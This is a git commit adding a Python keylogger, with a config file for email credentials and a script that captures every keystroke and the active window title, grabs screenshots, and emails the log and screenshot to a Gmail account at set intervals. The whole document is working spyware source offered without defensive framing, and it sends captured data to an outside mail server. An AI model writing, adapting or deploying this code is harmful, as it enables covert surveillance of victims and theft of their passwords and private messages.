08174b90095d9015a116cf951a081aa6bbc99dcd
Hiranyey Gajbhiye <hiranyeyg@gmail.com>
2019-01-07 20:34:54 +0530

    Inital Commit

---
+++ CONFIG.py
@@ -0,0 +1,5 @@
+email = ""
+password = ""
+Interval = 300  # in seconds
+File = "log.txt"
+Image = "Image.png"
---
+++ Keylogger.py
@@ -0,0 +1,92 @@
+from pynput.keyboard import Listener
+from win32gui import GetWindowText, GetForegroundWindow
+import smtplib
+import time
+import os
+import threading
+import traceback
+import PIL.ImageGrab
+from email.mime.multipart import MIMEMultipart
+from email.mime.image import MIMEImage
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import CONFIG
+
+CURRENT_WINDOW = "Nothing"
+DELETEFILE = False
+
+
+def send_email():
+    global DELETEFILE
+    time.sleep(3)
+    while True:
+        try:
+            message = MIMEMultipart()
+            message['From'] = CONFIG.email
+            message['To'] = CONFIG.email
+            message['Subject'] = "Keylogger Status"
+            image = PIL.ImageGrab.grab()
+            image.save(CONFIG.Image)
+            fp = open(CONFIG.Image, 'rb')
+            img = MIMEImage(fp.read())
+            fp.close()
+            img.add_header('Content-Disposition',
+                           "attachment; filename= %s" % "image.png")
+            message.attach(img)
+            attachment = open(CONFIG.File, "rb")
+            p = MIMEBase('application', 'octet-stream')
+            p.set_payload((attachment).read())
+            encoders.encode_base64(p)
+            p.add_header('Content-Disposition',
+                         "attachment; filename= %s" % "log.txt")
+            message.attach(p)
+            server = smtplib.SMTP('smtp.gmail.com:587')
+            server.ehlo()
+            server.starttls()
+            server.login(CONFIG.email, CONFIG.password)
+            server.sendmail(CONFIG.email, CONFIG.email,
+                            message.as_string())
+            server.quit()
+            os.remove(CONFIG.Image)
+            DELETEFILE = True
+        except:
+            traceback.print_exc()
+            print("Not DOne")
+        time.sleep(CONFIG.Interval)
+
+
+def write_to_file(key):
+    global DELETEFILE
+    global CURRENT_WINDOW
+    current = GetWindowText(GetForegroundWindow())
+    print(type(current))
+    if(CURRENT_WINDOW != current):
+        with open(CONFIG.File, 'a', encoding='utf-8') as f:
+            f.write("\n")
+            f.write(str(current))
+            f.write("\n")
+        CURRENT_WINDOW = current
+    print(CURRENT_WINDOW)
+    letter = str(key)
+    letter = letter.replace("'", "")
+    print(letter)
+    if(DELETEFILE):
+        with open(CONFIG.File, 'w') as f:
+            f.write(letter)
+        DELETEFILE = False
+    else:
+        with open(CONFIG.File, 'w') as f:
+            f.write(letter)
+
+
+def main():
+    EmailGenerator = threading.Thread(target=send_email)
+    EmailGenerator.start()
+    with Listener(on_press=write_to_file) as l:
+        l.join()
+    EmailGenerator.join()
+
+
+if __name__ == "__main__":
+    main()
